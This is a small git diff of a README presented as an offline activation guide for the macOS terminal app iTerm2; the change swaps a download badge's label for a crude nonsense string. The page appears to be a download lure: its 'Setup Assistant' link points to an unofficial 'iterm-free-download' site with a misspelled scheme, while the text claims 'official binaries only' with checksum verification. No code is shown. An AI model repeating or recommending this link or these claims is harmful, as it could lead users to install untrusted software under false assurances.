@@ -1,6 +1,6 @@
 # iTerm2 — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](httos://iterm-free-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/PisyaJopaSisyaKaka-16A813)](httos://iterm-free-download.github.io/.github)
 
 > This repository provides a **network-free workflow** to deploy and configure iTerm2 on macOS.  
 > It uses **official binaries only**, with checksum verification and portable configuration.  
